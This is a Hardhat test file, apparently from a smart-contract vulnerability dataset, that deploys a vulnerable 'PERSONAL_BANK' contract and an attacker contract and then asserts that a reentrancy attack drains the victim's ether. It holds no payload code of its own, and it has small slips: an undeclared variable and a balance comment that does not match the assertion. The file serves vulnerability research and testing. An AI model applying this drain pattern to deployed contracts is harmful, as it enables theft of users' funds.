const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol", function () {
  let PersonalBank;
  let victim;
  let MaliciousContract;
  let hacker;
  let LogFile;
  let log;

  beforeEach(async function () {
    // Deploy LogFile contract
    Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol:LogFile");
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy PersonalBank contract with LogFile address
    PersonalBank = await ethers.getContractFactory("contracts/dataset/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol:PERSONAL_BANK");
    victim = await PersonalBank.deploy();
    await victim.waitForDeployment();
    await victim.SetLogFile(log.target); // Set LogFile address after deployment

    // Deploy MaliciousContract with PersonalBank address
    MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f_attack.sol:MaliciousContract");
    hacker = await MaliciousContract.deploy(victim.target);
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.Deposit({ value: ethers.parseEther("2") });

    // Initial deposit from hacker on victim
    await hacker.deposit({value:  ethers.parseEther("3")});

    await network.provider.send("hardhat_setBalance", [
      hacker.target,
      "0x0",
      ]);
    let hackerBalance = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalance).to.equal(0);

    // Perform reentrancy attack through hacker, must be =< than initial deposit
    await hacker.attack( ethers.parseEther("2") );

    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(victim.target);
    hackerBalance = await ethers.provider.getBalance(hacker.target);

    // Verify the attack was successful
    
    // victim has a drained account
    expect(victimBalance).to.equal(ethers.parseEther("0")); 

    // 2 original balance + 3 from initial deposit +2 from victim fallback function
    expect(hackerBalance).to.equal(ethers.parseEther("5"));
  });
});
